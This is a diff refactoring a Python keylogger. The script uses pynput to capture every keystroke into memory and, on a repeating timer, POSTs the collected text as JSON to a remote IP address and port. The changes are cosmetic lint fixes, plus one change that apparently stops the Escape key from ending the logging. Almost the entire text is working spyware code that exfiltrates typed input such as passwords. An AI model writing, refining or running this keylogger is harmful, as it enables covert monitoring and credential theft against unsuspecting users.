@@ -1,12 +1,14 @@
 # Install pynput using the following command: pip install pynput
 # Import the mouse and keynboard from pynput
-from pynput import keyboard
-# We need to import the requests library to Post the data to the server.
-import requests
 # To transform a Dictionary to a JSON string we need the json package.
 import json
+
 #  The Timer module is part of the threading package.
 import threading
+
+# We need to import the requests library to Post the data to the server.
+import requests
+from pynput import keyboard
 
 # We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
 text = ""
@@ -25,13 +27,13 @@ def send_post_req():
         payload = json.dumps({"keyboardData": text})
         # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
         # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
-        r = requests.post(f"http://{ip_address}:{port_number}",
+        requests.post(f"http://{ip_address}:{port_number}",
                           data=payload, headers={"Content-Type": "application/json"})
         # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
         timer = threading.Timer(time_interval, send_post_req)
         # We start the timer thread.
         timer.start()
-    except:
+    except Exception:
         print("Couldn't complete request!")
 
 # We only need to log the key once it is released. That way it takes the modifier keys into consideration.
@@ -40,9 +42,6 @@ def send_post_req():
 def on_press(key):
     global text
 
-# Based on the key press we handle the way the key gets logged to the in memory string.
-# Read more on the different keys that can be logged here:
-# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.tab:
@@ -55,13 +54,13 @@ def on_press(key):
         pass
     elif key == keyboard.Key.backspace and len(text) > 0:
         text = text[:-1]
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
         pass
     elif key == keyboard.Key.esc:
-        return False
+        return None
     else:
-        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
         text += str(key).strip("'")
+    return None
 
 
 # A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
